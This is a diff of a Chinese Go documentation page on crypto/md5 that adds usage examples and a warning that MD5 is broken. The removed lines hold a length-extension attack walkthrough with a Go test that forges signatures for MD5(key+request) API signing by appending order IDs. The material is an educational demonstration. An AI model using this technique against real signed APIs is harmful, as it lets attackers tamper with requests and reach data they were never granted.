@@ -1,21 +1,46 @@
 # crypto/md5
 
-## MD5简介
+## 概述
 
-**MD5信息摘要算法**（英语：MD5 Message-Digest Algorithm），一种被广泛使用的[密码散列函数](https://baike.baidu.com/item/密码散列函数/14937715)，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。MD5由美国密码学家[罗纳德·李维斯特](https://baike.baidu.com/item/罗纳德·李维斯特/700199)（Ronald Linn Rivest）设计，于1992年公开，用以取代[MD4](https://baike.baidu.com/item/MD4/8090275)算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996年后该算法被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，专家一般建议改用其他算法，如[SHA-2](https://baike.baidu.com/item/SHA-2/22718180)。2004年，证实MD5算法无法防止碰撞（collision），因此**不适用于安全性认证**，如[SSL](https://baike.baidu.com/item/SSL/320778)公开密钥认证或是[数字签名](https://baike.baidu.com/item/数字签名/212550)等用途。
+{% hint style="info" %}
+md5包实现了 [RFC 1321](https://rfc-editor.org/rfc/rfc1321.html) 中定义的 MD5 哈希算法
+{% endhint %}
 
-以上出自[百度百科](https://baike.baidu.com/item/MD5/212708)
+{% hint style="warning" %}
+MD5 算法的密码学可靠性已经被攻破，不适用于安全应用
+{% endhint %}
+
+## 常量
+
+{% code title="src/crypto/md5.go" %}
+```go
+const BlockSize = 64
+const Size = 16
+```
+{% endcode %}
+
+## 示例
 
 {% tabs %}
 {% tab title="方式一" %}
 ```go
-11111
+data := []byte("These pretzels are making me thirsty.")
+fmt.Printf("%x\n", md5.Sum(data))
+
+//output
+//b0804ec967f48520697662a204f5fe72
 ```
 {% endtab %}
 
 {% tab title="方式二" %}
 ```go
-222222
+h := md5.New()
+h.Write([]byte("These pretzels are"))
+h.Write([]byte(" making me thirsty."))
+fmt.Printf("%x\n", h.Sum(nil))
+
+//output
+//b0804ec967f48520697662a204f5fe72
 ```
 {% endtab %}
 {% endtabs %}
@@ -99,97 +124,7 @@ Go语言提供的两种方式底层调用流程基本是一样的，主要是通
 
 从源码实现角度分析两种方式的应用场景
 
-`md5.New()方式`：通过`Write`方法追加写入，对于像请求签名这样需要拼合字符串的场景可以减少内存分配。再`Sum`方法的调用过程中会拷贝`digest`结构体及MD5返回值，优点是可以在生成MD5后继续追加数据生成新的值，缺点就是有多余的拷贝
-
 `md5.Sum方式`：需要开发人员自己拼合\[\]byte后调用，在预先分配内存的场景下速度更快，但是伴随的就会有内存回收的问题
 
-## MD5长度扩展攻击
-
 MD5虽然已经被证明有安全问题，但是在现行的接口签名中还是有部分使用。相应的签名格式定义问题就可能引发长度扩展攻击
-
-一般情况下在一个openapi平台注册之后，会生成AppID和AppKey。请求的时候需要明文传输AppID和其他请求参数，并且将请求串拼上AppKey后进行MD5签名，并传输MD5签名，服务端接收后按照同样的规则进行签名对比MD5值，确认数据是否被篡改
-
-常见的签名格式如下，其中第一种就可能会被长度扩展攻击
-
-1. MD5\(AppKey+请求串\)
-2. MD5\(AppKey+请求串+AppKey\)
-3. MD5\(请求串+AppKey\)
-
-假设现在有一个根据订单id批量获取订单信息的接口，签名拼接方式如下
-
-```text
-sign = md5(43f55d8396d0982fd62666883a9b3730appid=111orderIds=11111,999)
-```
-
-请求接口时参数如下
-
-```text
-appid=111&orderIds=11111,999&sign=745ae5112958a62414d673befafe2626
-```
-
-由于openapi的签名算法，数据拼接格式，以及AppKey对外开放的，也就是已知的。假定我们要在参数中追加两个id`,22222,33333`，具体的攻击步骤如下
-
-1. 根据明文和AppKey的长度可以推测整个签名字符串的长度，并且可以根据md5算法计算出最后分组的填充字符串
-2. 我们篡改后的明文就会变成
-
-   ```text
-   appid=111&orderIds=11111,999 + 填充字符串 + ,22222,33333
-   ```
-
-3. 将现有的sign值\(745ae5112958a62414d673befafe2626\)初始化到`digest.s`中，将`,22222,33333`追加写入待计算的`digest.x`然后计算MD5值就能得到延长后的MD5值
-4. 篡改后的请求如下
-
-   ```text
-   appid=111&orderIds=11111,999 + 填充字符串 + ,22222,33333&sign=d29332e75214b63c173b5485c7f07d45
-   ```
-
-这样服务端是可以通过验签操作的，至于能不能成功返回查询就要看服务端怎么解析请求参数了
-
-实现代码如下
-
-```go
-package test
-
-import (
-
-  "encoding/hex"
-
-  "fmt"
-
-  "testing"
-
-  "github.com/coredumptoday/hashpump/md5"
-
-)
-
-const KEY = "43f55d8396d0982fd62666883a9b3730"
-
-func TestMD5Pump(t *testing.T) {
-
-  data := "appid=111orderIds=11111,999"
-
-  injectData := ",22222,33333"
-
-  originMd5Str := md5.Sum([]byte(KEY + data))
-
-  fmt.Println("origin:", hex.EncodeToString(originMd5Str[:]), KEY+data)
-
-  newSign, newStr, err := md5.HashPump(hex.EncodeToString(originMd5Str[:]), data, injectData, len(KEY))
-
-  fmt.Println(hex.EncodeToString(newSign))
-
-  fmt.Println(string(newStr))
-
-  fmt.Println(err)
-
-  m := md5.Sum([]byte(KEY + string(newStr)))
-
-  fmt.Println(hex.EncodeToString(m[:]))
-
-  if hex.EncodeToString(m[:]) == hex.EncodeToString(newSign) {
-    fmt.Println("It Worked!!!")
-  }
-
-}
-```
 
